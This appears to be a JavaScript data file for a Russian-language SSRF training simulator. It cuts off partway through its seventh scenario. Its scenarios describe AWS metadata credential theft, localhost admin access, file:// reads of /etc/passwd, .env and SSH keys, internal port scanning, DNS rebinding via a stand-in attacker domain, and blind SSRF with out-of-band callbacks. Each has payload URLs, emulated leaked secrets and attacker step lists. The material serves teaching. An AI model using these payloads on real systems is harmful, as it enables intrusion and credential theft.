export const scenarios = [
  {
    id: 1,
    name: 'Чтение облачных метаданных AWS',
    category: 'Облако',
    description:
      'Атакующий заставляет сервер обратиться к внутреннему IP 169.254.169.254 — это специальный эндпойнт метаданных AWS EC2. Через него можно получить временные IAM-ключи, конфигурацию инстанса, сетевые настройки и многое другое. Утечка IAM-ключей означает компрометацию всего облачного окружения, а не только одного сервера — атакующий получает доступ ко всем сервисам AWS в рамках роли инстанса (S3, DynamoDB, Lambda, SQS и сотни других).',
    preExplanation:
      'Перед тем как нажать «Отправить», представьте: ваш сервер работает на виртуальной машине AWS. AWS автоматически выдаёт этой машине временные ключи доступа каждые 6 часов — они нужны для взаимодействия с другими сервисами AWS (например, чтобы читать файлы из S3 без явного пароля). Ключи доступны по зарезервированному адресу 169.254.169.254, который работает только внутри AWS-сети. В нормальной ситуации к этому адресу обращается только сама машина. Но если атакующий заставит ваш сервер сходить по этому адресу и вернуть ответ — ключи утекут. Попробуйте отправить запрос ниже.',
    placeholder: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
    matchUrl: (url) =>
      url.includes('169.254.169.254') || url.includes('metadata'),
    emulatedResponse: (url) => {
      if (url.includes('iam/security-credentials')) {
        return {
          Code: 'Success',
          LastUpdated: '2024-12-01T10:00:00Z',
          Type: 'AWS-HMAC',
          AccessKeyId: 'AKIAIOSFODNN7EXAMPLE',
          SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
          Token: 'FQoGZXIvYXdzEGMaDNuOEXAMPLE==',
          Expiration: '2024-12-01T16:00:00Z',
        };
      }
      if (url.includes('ami-id')) {
        return 'ami-0abcdef1234567890';
      }
      if (url.includes('local-ipv4')) {
        return '10.0.1.42';
      }
      if (url.includes('iam/')) {
        return {
          'admin-role': 'admin-role',
          'readonly-role': 'readonly-role',
          'lambda-executor': 'lambda-executor',
        };
      }
      if (url.includes('meta-data/')) {
        return {
          'ami-id': 'ami-0abcdef1234567890',
          'instance-type': 'm5.xlarge',
          'local-ipv4': '10.0.1.42',
          'local-hostname': 'ip-10-0-1-42.ec2.internal',
          'iam/': 'List of IAM roles attached to this instance',
          'network/': 'Network configuration',
          'public-ipv4': '54.123.45.67',
        };
      }
      return { status: 404, error: 'Not Found', message: 'Указанный путь метаданных не найден. Попробуйте /latest/meta-data/ для списка доступных путей.' };
    },
    responseAnnotation:
      'Обратите внимание на поля AccessKeyId, SecretAccessKey и Token — это полноценные учётные данные AWS IAM с правами роли admin-role. Если бы это был реальный сервер, атакующий уже мог бы использовать эти ключи для доступа к S3 (чтение/запись файлов), DynamoDB (чтение/удаление таблиц), Lambda (создание вредоносных функций) и любым другим сервисам, к которым у роли есть доступ. Ключи действительны 6 часов — этого достаточно для массового скачивания данных или создания backdoor-ресурсов.',
    explanation:
      'В AWS каждые 6 часов автоматически генерируются временные ключи для роли EC2-инстанса (Instance Profile). Это сделано для удобства разработчиков: приложение не должно хранить статические пароли от S3 или DynamoDB — оно автоматически получает их от AWS при запуске. Но если приложение уязвимо к SSRF, атакующий получает эти ключи через URL 169.254.169.254/latest/meta-data/iam/security-credentials/ и может делать всё, что разрешено роли инстанса. Важно: даже если приложение не хранит никаких секретов явно в коде или переменных окружения, они всё равно утекают через метаданные. Для защиты AWS внедрила IMDSv2 (Instance Metadata Service v2), который требует PUT-запрос для получения токена, но многие старые инстансы всё ещё используют IMDSv1.',
    realWorldExample:
      'Capital One (2019): Атакующая Paige Thompson обнаружила SSRF на WAF (Web Application Firewall) Capital One, получила IAM-ключи из AWS метаданных и скачала данные 106 миллионов клиентов из S3. Ущерб составил более 190 миллионов долларов. Этот инцидент стал катализатором массового внедрения IMDSv2 и stricter IAM-политик во всей индустрии.',
    stepByStep: [
      'Атакующий находит функцию в приложении, которая принимает URL от пользователя (загрузка изображения, вебхук, превью ссылки).',
      'Вместо нормального URL он подставляет http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role.',
      'Сервер приложения (работающий на AWS EC2) отправляет HTTP-запрос по этому адресу от своего имени.',
      'AWS возвращает временные IAM-ключи, потому что запрос пришёл с самого инстанса (внутренняя сеть).',
      'Сервер возвращает эти ключи атакующему как «ответ на запрос изображения» (или другой функции).',
      'Атакующий использует awscli с полученными ключами: aws s3 ls --access-key AKIAIOS... и получает доступ ко всем бакетам.',
    ],
    severity: 'critical',
  },
  {
    id: 2,
    name: 'Доступ к внутренней админ-панели (localhost)',
    category: 'Внутренние сервисы',
    description:
      'Атакующий использует URL вида http://localhost/admin или http://127.0.0.1:8080/manage для доступа к внутренним панелям управления, которые недоступны извне. Разработчики часто полагают, что если сервис слушает только на 127.0.0.1, то он надёжно защищён. Но SSRF делает этот «защищённый» сервис доступным любому пользователю извне. Многие внутренние сервисы доверяют всем запросам с localhost и не требуют аутентификацию для локальных подключений.',
    preExplanation:
      'В большинстве компаний внутренние сервисы (админ-панели, мониторинг Grafana, phpMyAdmin, API для отладки, панели управления Jenkins) доступны только по адресу localhost или 127.0.0.1. Разработчики считают: «Снаружи не достанут — и хорошо». Но если на том же сервере есть веб-приложение с SSRF-уязвимостью, атакующий использует его как мост: он говорит приложению «сходи на http://localhost:8080/admin», и приложение, будучи на том же сервере, беспрепятственно заходит на внутреннюю панель. Более того, многие админ-панели отключают аутентификацию для запросов с localhost — «ведь это наш же сервер». Попробуйте отправить запрос ниже — вы увидите, что вернётся.',
    placeholder: 'http://localhost:8080/admin/users',
    matchUrl: (url) =>
      url.includes('localhost') || url.includes('127.0.0.1') || url.includes('0.0.0.0'),
    emulatedResponse: (url) => {
      if (url.includes('/admin') || url.includes('/manage')) {
        return {
          status: 200,
          page: 'Admin Panel — Internal Management Console',
          version: '2.4.1',
          users: [
            { id: 1, username: 'admin', role: 'superadmin', email: 'admin@company.internal', lastLogin: '2024-12-01T09:15:00Z' },
            { id: 2, username: 'db_admin', role: 'dba', email: 'dba@company.internal', lastLogin: '2024-11-30T18:42:00Z' },
            { id: 3, username: 'svc_backup', role: 'service', email: 'backup@company.internal', lastLogin: '2024-12-01T03:00:00Z' },
            { id: 4, username: 'deploy_user', role: 'devops', email: 'deploy@company.internal', lastLogin: '2024-11-29T14:20:00Z' },
          ],
          sessions: 42,
          activeConnections: 7,
          warning: 'Панель управления доступна без дополнительной аутентификации из внутренней сети (X-Forwarded-For: 127.0.0.1)',
          databaseStatus: 'PostgreSQL 15.4 — connected (10.0.1.10:5432)',
        };
      }
      if (url.includes(':8080') || url.includes(':3000') || url.includes(':9090')) {
        return {
          status: 200,
          service: 'Internal API Gateway',
          version: '2.1.0',
          endpoints: ['/api/v1/users', '/api/v1/config', '/api/v1/debug', '/api/v1/health', '/api/v1/secrets'],
          environment: 'production',
          debugMode: true,
          notice: 'WARNING: Debug endpoint (/api/v1/debug) is enabled in production. This exposes stack traces, database queries, and environment variables.',
        };
      }
      if (url.includes('/health') || url.includes('/metrics')) {
        return {
          status: 200,
          service: 'Prometheus Metrics',
          metrics: {
            http_requests_total: 1452301,
            http_request_duration_seconds_avg: 0.042,
            db_connections_active: 15,
            db_connections_max: 100,
            memory_usage_bytes: 536870912,
            cpu_usage_percent: 67.3,
          },
          internalServices: [
            { name: 'postgres', host: '10.0.1.10', port: 5432, status: 'healthy' },
            { name: 'redis', host: '10.0.1.20', port: 6379, status: 'healthy' },
            { name: 'elasticsearch', host: '10.0.1.30', port: 9200, status: 'degraded' },
          ],
        };
      }
      return { status: 404, error: 'Service not found on specified port/path' };
    },
    responseAnnotation:
      'Сервер вернул список пользователей админ-панели с их ролями, email-адресами и временем последнего входа. Обратите внимание: поле «warning» говорит, что панель доступна без аутентификации из внутренней сети (потому что запрос пришёл от 127.0.0.1). Также видим статус подключения к PostgreSQL — атакующий теперь знает внутренний IP базы данных (10.0.1.10:5432). Атакующий знает usernames (admin, db_admin, deploy_user) и может попытаться подобрать пароли, использовать сессии (их 42) для дальнейшего проникновения, или атаковать базу данных напрямую по известному IP.',
    explanation:
      'Многие внутренние сервисы (админ-панели, API-шлюзы, мониторинг, системы CI/CD) слушают только на localhost/127.0.0.1, потому что разработчики считают это достаточной защитой. Это критическое заблуждение: localhost-доступ не является защитой, если на сервере есть другое приложение, которое принимает пользовательский ввод и делает HTTP-запросы. Особенно опасно, что многие внутренние сервисы полностью отключают аутентификацию для запросов с localhost (trust relationship). Это делается для удобства — чтобы скрипты мониторинга или другие внутренние сервисы могли обращаться без паролей. Но SSRF позволяет атакующему «прыгнуть» через уязвимый сервер прямо к этим сервисам, минуя сетевые экраны, балансировщики и системы контроля доступа.',
    realWorldExample:
      'В 2021 году через SSRF на одном из SaaS-сервисов атакующие получили доступ к внутренней панели Grafana (http://localhost:3000), где хранились метрики производительности с конфиденциальной информацией о топологии сети, ошибках аутентификации и запросах к базе данных. Это помогло им спланировать дальнейшую атаку на инфраструктуру клиента.',
    stepByStep: [
      'Атакующий обнаруживает, что приложение принимает URL для загрузки превью страницы или генерации PDF.',
      'Он пробует http://localhost:8080 — сервер отвечает 200 OK (внутренний API-шлюз работает).',
      'Затем атакующий перебирает стандартные пути: /admin, /manage, /debug, /api/config, /metrics, /health.',
      'По адресу /admin/users сервер возвращает список пользователей с ролями, email и временем последнего входа.',
      'Из /health или /metrics атакующий получает карту внутренней инфраструктуры: IP-адреса и статусы баз данных, кэшей, поисковых движков.',
      'Используя полученные данные (имена пользователей, IP внутренних сервисов, открытые порты), он планирует следующий этап атаки.',
    ],
    severity: 'high',
  },
  {
    id: 3,
    name: 'Чтение локальных файлов (file://)',
    category: 'Файловая система',
    description:
      'Некоторые библиотеки HTTP-клиентов (cURL, Python requests, Java HttpURLConnection, Node.js с определёнными модулями) поддерживают протокол file://. Если приложение передаёт пользовательский URL в такую библиотеку без проверки протокола, атакующий может прочитать любые файлы, доступные процессу сервера: конфигурации с паролями, SSH-ключи, хеши паролей пользователей, исходный код приложения.',
    preExplanation:
      'Обычно мы ассоциируем URL с http:// или https://. Но существует и протокол file:// — он указывает на файл в локальной файловой системе сервера. Если разработчик использует библиотеку, которая понимает этот протокол (а cURL, Java HttpURLConnection и многие другие понимают), и не проверяет, что URL начинается с http, атакующий может подставить file:///etc/passwd. Сервер прочитает этот файл через файловую систему и вернёт его содержимое. Это не HTTP-запрос — библиотека просто открывает файл. Попробуйте — ниже вы увидите содержимое системного файла (эмулированное).',
    placeholder: 'file:///etc/passwd',
    matchUrl: (url) => url.startsWith('file://'),
    emulatedResponse: (url) => {
      if (url.includes('/etc/passwd')) {
        return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL Server:/var/lib/postgresql:/bin/bash
redis:x:108:116:Redis Server:/var/lib/redis:/usr/sbin/nologin
appuser:x:1000:1000:Application User:/home/appuser:/bin/bash
deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash`;
      }
      if (url.includes('/etc/shadow')) {
        return { status: 403, error: 'Permission denied', note: 'Файл /etc/shadow доступен только root. Если приложение запущено от root (частая ошибка в Docker-контейнерах) — файл БУДЕТ прочитан и содержимое хешей паролей утекает.' };
      }
      if (url.includes('.env') || url.includes('config') || url.includes('secret')) {
        return `# Application Environment Configuration
DB_HOST=10.0.1.10
DB_PORT=5432
DB_USER=app_user
DB_PASS=Sup3rS3cretP@ssw0rd!
DB_NAME=production_db
REDIS_URL=redis://:password123@10.0.1.20:6379
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=eyJhbGciOiJIUzI1NiJ9.super.secret.key.do.not.share
STRIPE_API_KEY=sk_live_51AbCdEf...hidden...
SENDGRID_API_KEY=SG.abc123...hidden...
ADMIN_EMAIL=admin@company.com
SMTP_PASSWORD=mailS3rv3rP@ss!`;
      }
      if (url.includes('id_rsa') || url.includes('.ssh/')) {
        return `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDRQjOL8E9iJvPYgHqBfE9C8C4ZkJ1KbLVbqMZ+J8L5AAAAJiNvFh0Yjx
YdGIHAAAAAtzdWl0ZS1zc2gAAAAhdHJ1c3QtbG9jYWwAY21kAAAAHc3NoLWVkMjU1MTkA
AAIQCFCNI4vQT2Im89iAeoF8T0LwLhmQnUpstVuoxn4nwvkAAAAgP6F7sL8kzN6RiC+vD
NxE8jKGBcRjOlN5MFnPJ5zh8AAAAdGFyZ2V0LXVzZXJAaG9zdA==
-----END OPENSSH PRIVATE KEY-----`;
      }
      return { status: 404, error: 'File not found', hint: 'Попробуйте: file:///etc/passwd, file:///etc/shadow, file:///.env, file:///home/appuser/.ssh/id_rsa' };
    },
    responseAnnotation:
      'Вы видите содержимое /etc/passwd — системного файла Linux, содержащего список всех пользователей системы. Например, строка «appuser:x:1000:1000:Application User:/home/appuser:/bin/bash» говорит, что на сервере есть пользователь appuser с bash-оболочкой (может выполнять команды). Строка «postgres:x:109:117» говорит о наличии PostgreSQL. Строка «www-data:x:33:33» — серверное приложение работает от этого пользователя. Атакующий теперь знает usernames, home-директории и оболочки всех пользователей на сервере. Это информация для дальнейшей атаки: подбор паролей, попытка чтения .ssh/id_rsa, .env файлов и т.д.',
    explanation:
      'Протокол file:// позволяет читать файлы из локальной файловой системы сервера. Это не HTTP-запрос — библиотека просто открывает файл и читает его, как обычную программу. Поддержка file:// включена по умолчанию в cURL, Java HttpURLConnection, Python urllib (но не requests), Node.js с рядом модулей. Если сервер использует такую библиотеку и не фильтрует протоколы, атакующий может прочитать: /etc/passwd (все пользователи системы), /etc/shadow (хеши паролей, если процесс от root), .env (секреты приложения: пароли БД, API-ключи, JWT-секреты), ~/.ssh/id_rsa (SSH-ключи для проникновения на другие серверы), конфигурационные файлы баз данных и других сервисов. В Docker-контейнерах приложения часто работают от root, что делает доступными ВСЕ файлы системы.',
    realWorldExample:
      'В 2020 году через SSRF с протоколом file:// на сервисе генерации PDF (wkhtmltopdf) атакующий прочитал файл .env приложения и получил пароль от PostgreSQL. Это привело к утечке 15 миллионов записей клиентов. wkhtmltopdf поддерживает file:// по умолчанию, и разработчики не отключили эту возможность.',
    stepByStep: [
      'Атакующий находит функцию, которая загружает контент по URL (генерация PDF, фетч изображения, импорт данных).',
      'Вместо HTTP-ссылки он подставляет file:///etc/passwd.',
      'Серверная библиотека (cURL, HttpURLConnection и т.д.) поддерживает file:// и читает файл напрямую из файловой системы.',
      'Содержимое файла возвращается атакующему в ответе.',
      'Атакующий анализирует полученные данные: usernames, установленные сервисы (postgres, redis), домашние директории.',
      'Следующий шаг: file:///.env для получения паролей, file:///home/appuser/.ssh/id_rsa для SSH-ключей.',
    ],
    severity: 'high',
  },
  {
    id: 4,
    name: 'Сканирование внутренних портов',
    category: 'Разведка',
    description:
      'Через SSRF-уязвимость атакующий может определить, какие порты открыты на сервере или соседних машинах во внутренней сети. Метод прост: он отправляет запросы на разные порты и анализирует разницу в ответах. Открытый порт вернёт HTTP-ответ, баннер сервиса или ошибку протокола, а закрытый — ошибку соединения (connection refused). Это позволяет составить полную карту внутренней инфраструктуры за минуты.',
    preExplanation:
      'Представьте, что вы хотите узнать, какие двери в здании открыты. Вы по очереди дёргаете каждую ручку. Если дверь открылась — вы знаете, что за ней есть комната. Через SSRF атакующий делает то же самое с портами: отправляет запрос на http://192.168.1.1:22, потом :3306, потом :5432 и так далее. По типу ответа он понимает, открыт порт или нет. Попробуйте — введите адрес с любым портом из списка: 22 (SSH), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 9200 (Elasticsearch), 27017 (MongoDB).',
    placeholder: 'http://192.168.1.1:3306',
    matchUrl: (url) => {
      const portMatch = url.match(/:(\d+)/);
      if (portMatch) {
        const port = parseInt(portMatch[1], 10);
        return port !== 80 && port !== 443;
      }
      return false;
    },
    emulatedResponse: (url) => {
      const portMatch = url.match(/:(\d+)/);
      if (!portMatch) return { status: 400, error: 'No port specified' };

      const port = parseInt(portMatch[1], 10);
      const knownPorts = {
        22: { service: 'SSH', version: 'OpenSSH 8.9p1', banner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6', authMethods: ['publickey', 'password'] },
        3306: { service: 'MySQL', version: '8.0.35', banner: 'J\u00005.7.42-log\u0000...protocol mismatch', ssl: false, maxConnections: 151 },
        5432: { service: 'PostgreSQL', version: '15.4', banner: 'PostgreSQL 15.4 protocol negotiation', ssl: true, databaseCount: 12 },
        6379: { service: 'Redis', version: '7.2.3', banner: '# Redis version=7.2.3, sha=00000000, malloc=jemalloc-5.2.1', authRequired: false, memory: '2.4GB used / 8GB max' },
        8080: { service: 'HTTP (Tomcat/Jetty)', version: 'Apache Tomcat/9.0.85', serverHeader: 'Apache-Coyote/1.1' },
        8443: { service: 'HTTPS (Alternative)', version: 'nginx/1.24.0', ssl: true, certificateCN: '*.company.internal' },
        27017: { service: 'MongoDB', version: '7.0.4', banner: 'MongoDB server version: 7.0.4', authRequired: false, databaseSize: '48.2 GB' },
        9200: { service: 'Elasticsearch', version: '8.11.1', clusterName: 'production-cluster', nodeCount: 3, indicesCount: 47, documentsCount: 12500000 },
        9090: { service: 'Prometheus', version: '2.48.1', targets: 23, alerts: 3 },
        11211: { service: 'Memcached', version: '1.6.22', maxMemory: '4096 MB', currentItems: 1523420 },
      };

      if (knownPorts[port]) {
        return {
          status: 200,
          found: true,
          port,
          ...knownPorts[port],
          note: 'Сервис ответил — порт открыт и доступен из сети уязвимого сервера. Атакующий может использовать эту информацию для целенаправленной атаки на найденный сервис.',
        };
      }

      return {
        status: 'connection refused',
        found: false,
        port,
        note: 'Соединение отклонено — порт закрыт или сервис не запущен. Таймаут отличит закрытый порт от отфильтрованного firewall-ом.',
      };
    },
    responseAnnotation:
      'Сервер ответил детальной информацией о сервисе. Теперь атакующий знает: на порту 3306 работает MySQL 8.0.35 без SSL, на порту 6379 работает Redis 7.2.3 без аутентификации (!), на порту 9200 работает Elasticsearch с 12 миллионами документов. Redis без пароля — это критическая находка: через SSRF (или напрямую, зная IP) атакующий может выполнить команды Redis и, например, записать свой SSH-ключ или веб-шелл. Обратите внимание, что MongoDB тоже без аутентификации — это распространённая ошибка конфигурации.',
    explanation:
      'Путём перебора портов и анализа ответов атакующий составляет карту внутренней сети. Это разведка (reconnaissance) — первый этап любой атаки. Зная, какие сервисы работают и их версии, атакующий может: найти известные уязвимости конкретных версий (CVE), проверить наличие аутентификации (Redis без пароля — мгновенный доступ), определить технологический стек компании, спланировать цепочку атак. Сканирование через SSRF особенно опасно тем, что запросы идут от доверенного IP-адреса (внутреннего сервера), поэтому whitelist-ы на базах данных и других сервисах не помогают — они видят запрос от «своего» сервера.',
    realWorldExample:
      'В 2022 году атакующие использовали SSRF для сканирования внутренней сети крупного e-commerce. Они нашли незащищённый Redis (порт 6379) без пароля, записали через него свой публичный SSH-ключ в файл authorized_keys и получили полный доступ к серверу. Вся атака началась с простой функции «проверить доступность URL» на маркетплейсе.',
    stepByStep: [
      'Атакующий отправляет запрос на http://192.168.1.1:22 через SSRF-уязвимую функцию.',
      'Сервер возвращает SSH-баннер: «SSH-2.0-OpenSSH_8.9» — порт 22 открыт.',
      'Затем http://192.168.1.1:3306 — получает баннер MySQL 8.0.35 (порт открыт).',
      'Затем http://192.168.1.1:6379 — получает баннер Redis (порт открыт, без аутентификации!).',
      'Перебирая 20-30 портов, атакующий составляет полный список: SSH(22), MySQL(3306), PostgreSQL(5432), Redis(6379), ES(9200).',
      'Для каждого найденного сервиса атакующий подбирает отдельную атаку. Redis без пароля — первый приоритет.',
    ],
    severity: 'medium',
  },
  {
    id: 5,
    name: 'Обход защиты через DNS Rebinding',
    category: 'Продвинутые техники',
    description:
      'DNS Rebinding — техника, позволяющая обойти практически любую SSRF-защиту, основанную на проверке IP-адреса. Атакующий регистрирует домен, который при первом DNS-запросе резолвится на «безопасный» публичный IP (проходит проверку), а при фактическом выполнении HTTP-запроса — на внутренний IP (127.0.0.1 или 169.254.169.254). Разница между двумя запросами может составлять всего 100-200 миллисекунд.',
    preExplanation:
      'Большинство защит от SSRF работают так: перед выполнением запроса сервер проверяет, что URL ведёт на «безопасный» IP (не на 127.0.0.1, не на 169.254.169.254 и т.д.). Но что если IP-адрес домена изменится МЕЖДУ проверкой и фактическим запросом? Именно это делает DNS Rebinding: специальный DNS-сервер атакующего возвращает разные IP для быстрых последовательных запросов. Первый — «хороший» (проверка пройдена), второй — «плохой» (фактический запрос ушёл на метаданные AWS). Временное окно — всего 100-200 мс. Ниже вы увидите, как это выглядит в логах.',
    placeholder: 'http://evil.rebind.attacker.com/reset-password',
    matchUrl: (url) => url.includes('rebind') || url.includes('attacker.com'),
    emulatedResponse: (url) => {
      return {
        timeline: [
          { phase: 'VALIDATION', time: '10:00:00.001ms', action: 'DNS lookup (validation)', domain: 'evil.rebind.attacker.com', resolved_ip: '93.184.216.34', result: 'PASS — IP не в блоклисте (публичный IP example.com)', color: 'green' },
          { phase: 'REQUEST', time: '10:00:00.150ms', action: 'DNS lookup (HTTP client)', domain: 'evil.rebind.attacker.com', resolved_ip: '169.254.169.254', result: 'REQUEST SENT to 169.254.169.254 (AWS metadata)', color: 'red' },
          { phase: 'RESPONSE', time: '10:00:00.310ms', action: 'AWS metadata response received', data: 'IAM credentials leaked', result: 'CRITICAL — защита обойдена', color: 'red' },
        ],
        filter_result: 'PASS — IP 93.184.216.34 не в блоклисте',
        actual_target: '169.254.169.254/latest/meta-data/iam/security-credentials/',
        response: {
          Code: 'Success',
          AccessKeyId: 'AKIAIOSFODNN7EXAMPLE',
          SecretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
          Token: 'FQoGZXIvYXdzEGMaDNuOEXAMPLE==',
        },
        gap_explanation: '150 миллисекунд между двумя DNS-запросами. За это время TTL=0 DNS-запись изменилась с 93.184.216.34 на 169.254.169.254. Проверка видит первый IP, HTTP-клиент отправляет запрос на второй.',
      };
    },
    responseAnnotation:
      'Ключевой момент — посмотрите на timeline. Фаза VALIDATION (10:00:00.001ms): DNS вернул 93.184.216.34 — публичный IP, проверка пройдена. Фаза REQUEST (10:00:00.150ms): всего через 150 мс DNS вернул 169.254.169.254 — внутренний IP AWS. Сервер проверил IP первого DNS-запроса, а HTTP-запрос ушёл на IP второго разрешения. Стандартные блоклисты IP-адресов абсолютно бесполезны против этой атаки.',
    explanation:
      'DNS Rebinding эксплуатирует фундаментальное свойство DNS: между проверкой IP-адреса и фактическим HTTP-запросом проходит время, за которое DNS-запись может измениться. Атакующий настраивает свой DNS-сервер с TTL=0 и чередующимися записями: первый запрос → безопасный IP, второй → внутренний IP. Большинство SSRF-защит делают DNS-запрос для валидации, а затем передают URL в HTTP-клиент, который делает свой отдельный DNS-запрос. Эти два запроса — и есть уязвимое окно. В 2023 году исследователи продемонстрировали, что DNS Rebinding обходит SSRF-защиту всех основных облачных провайдеров (AWS, GCP, Azure), даже при наличии WAF и sophisticated IP-блоклистов. Эффективная защита требует «DNS pinning» (запоминание первого IP и его использование для фактического запроса) или отдельных резолверов с кэшированием.',
    realWorldExample:
      'В 2023 году команда исследователей продемонстрировала атаку DNS Rebinding на внутренние сервисы AWS, GCP и Azure. Они показали, что даже при наличии WAF, блоклистов IP и IMDSv2, DNS Rebinding позволяет достичь внутренних метаданных и сервисов через уязвимые приложения. Это привело к обновлению рекомендаций по SSRF-защите у всех крупных облаков.',
    stepByStep: [
      'Атакующий регистрирует домен (например, evil.attacker.com) на своём авторитетном DNS-сервере.',
      'Настраивает DNS с TTL=0 и чередующимися A-записями: первый запрос → 93.184.216.34 (публичный IP), второй → 169.254.169.254 (AWS metadata).',
      'Подставляет http://evil.attacker.com/path в уязвимую функцию приложения.',
      'Сервер делает DNS-запрос #1 для валидации URL — получает 93.184.216.34. Проверка пройдена!',
      'Сервер передаёт URL в HTTP-клиент (cURL, requests, fetch). HTTP-клиент делает свой DNS-запрос #2 — получает 169.254.169.254.',
      'HTTP-запрос уходит на 169.254.169.254. Защита полностью обойдена через 150-мс окно.',
    ],
    severity: 'critical',
  },
  {
    id: 6,
    name: 'Слепой SSRF (Blind SSRF)',
    category: 'Продвинутые техники',
    description:
      'В слепом SSRF атакующий не видит ответ от внутреннего ресурса напрямую. Сервер либо не возвращает содержимое ответа, либо возвращает обобщённую ошибку. Однако атакующий всё равно может确认, что запрос был выполнен, по побочным эффектам: изменениям в базе данных, логам, срабатыванию триггеров, задержкам ответа или out-of-band (OOB) каналу связи через DNS/HTTP.',
    preExplanation:
      'Не всегда сервер возвращает содержимое ответа от внутреннего ресурса. Иногда приложение говорит только «OK» или «Ошибка» без деталей. Это слепой SSRF — атакующий не видит ответ, но может подтвердить успешность атаки другими способами. Самый распространённый метод — out-of-band: атакующий указывает свой сервер (например, http://attacker.com/log) и проверяет, пришёл ли запрос. Ниже эмулируется сценарий, где атакующий использует OOB-технику через Burp Collaborator (или свой сервер) для обнаружения слепого SSRF.',
    placeholder: 'http://oast.fun/log?session=ssrf-test-12345',
    matchUrl: (url) => url.includes('oast') || url.includes('collaborator') || url.includes('burp') || url.includes('oob'),
    emulatedResponse: (url) => {
      return {
        scenario: 'Blind SSRF — Out-of-Band Detection',
        explanation: 'Сервер не вернул содержимое ответа, но выполнил запрос. Атакующий подтверждает это через OOB-канал.',
        oob_channel: {
          type: 'DNS + HTTP',
          url: 'http://oast.fun/log?session=ssrf-test-12345',
          status: 'Interaction received!',
        },
        dns_log: [
          { timestamp: '10:00:00.450ms', query: 'ssrf-test-12345.oast.fun', type: 'A', source_ip: '10.0.1.42', note: 'DNS-запрос от уязвимого сервера!' },
          { timestamp: '10:00:00.620ms', query: 'ssrf-test-12345.oast.fun', type: 'AAAA', source_ip: '10.0.1.42', note: 'IPv6 DNS-запрос также от сервера' },
        ],
        http_log: [
          { timestamp: '10:00:00.580ms', method: 'GET', url: 'http://oast.fun/log?session=ssrf-test-12345', source_ip: '10.0.1.42', user_agent: 'python-requests/2.31.0', note: 'HTTP-запрос от сервера с заголовками приложения' },
        ],
        leaked_headers: {
          'X-Forwarded-For': '10.0.1.42',
          'User-Agent': 'python-requests/2.31.0',
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.internal-secret',
        },
        impact: 'Внутренний IP сервера (10.0.1.42), стек (Python/requests), и даже внутренний JWT-токен утекли через HTTP-заголовки.',
        next_steps: [
          'Подтверждён Blind SSRF — сервер делает запросы по указанному URL.',
          'Теперь атакующий может: http://169.254.169.254/latest/meta-data/ для AWS-ключей.',
          'Или сканировать внутреннюю сеть: http://10.0.1.X:PORT/',
          'Или использовать gopher:// для отправки команд во внутренние сервисы.',
        ],
      };
    },
    responseAnnotation:
      'Ключевой момент: сервер вернул «OK» без деталей, но на OOB-сервер атакующего пришли DNS-запросы и HTTP-запрос от IP 10.0.1.42 (внутренний IP уязвимого сервера). Даже это уже ценная информация! Более того, в HTTP-заголовках утёк внутренний JWT-токен (Authorization: Bearer eyJ...internal-secret). Это частая ошибка — сервер передаёт свои внутренние заголовки при исходящих запросах. Слепой SSRF опасен тем, что он гораздо сложнее для обнаружения: в логах приложения нет ничего подозрительного, а данные утекают через побочные каналы.',
    explanation:
      'Слепой SSRF (Blind SSRF) — это когда атакующий может заставить сервер сделать запрос, но не может увидеть ответ напрямую. Это происходит, когда приложение: не возвращает содержимое ответа (только статус), возвращает обобщённую ошибку, обрабатывает ответ асинхронно (например, webhook). Для обнаружения слепого SSRF используются: Out-of-Band (OOB) техника — атакующий указывает URL своего сервера и проверяет взаимодействие; Time-based — атакующий отправляет запрос на внутренний ресурс, который отвечает медленно (например, /sleep?10), и измеряет время ответа; Differential — сравнение ответов при обращении к существующим и несуществующим внутренним ресурсам. OOB — самый надёжный метод. Инструменты: Burp Collaborator, interactsh, OAST (Open Application Security Testing) серверы.',
    realWorldExample:
      'В 2021 году на платформе HackerOne исследователь обнаружил слепой SSRF через функцию вебхуков в SaaS-приложении. Сервер не возвращал содержимое ответа, но через OOB-канал (Burp Collaborator) исследователь подтвердил, что сервер делает запросы. Затем он направил запрос на 169.254.169.254 и получил IAM-ключи через DNS-туннель (данные кодировались в поддоменах DNS-запросов). Уязвимость была оценена в $15,000.',
    stepByStep: [
      'Атакующий находит функцию, которая принимает URL, но не возвращает содержимое ответа (вебхук, импорт, пинг).',
      'Он указывает URL своего OOB-сервера: http://unique-id.oast.fun/callback.',
      'Если на OOB-сервер приходит запрос — SSRF подтверждён, даже если приложение вернуло «OK».',
      'Атакующий анализирует HTTP-заголовки и исходный IP запроса (утекает внутренний IP и стек).',
      'Теперь он может направить запрос на внутренние цели: 169.254.169.254, 10.0.1.X, localhost.',
      'Для извлечения данных из слепого SSRF используется DNS-туннелирование: данные кодируются в поддоменах DNS-запросов.',
    ],
    severity: 'critical',
  },
  {
    id: 7,
    name: 'Обход фильтров (URL Parsing Bypass)',
    category: 'Обход защиты',
    description:
      'Многие приложения пытаются защититься от SSRF с помощью чёрных списков (блокируют 127.0.0.1, 169.254.169.254, localhost и т.д.) или белых списков (разрешают только определённые домены). Однако inconsistency в URL-парсинге между валидатором и HTTP-клиентом позволяет обойти эти фильтры. Разные библиотеки по-разному обрабатывают URL-encoding, учётные данные в URL, фрагменты и другие особенности стандарта.',
    preExplanation:
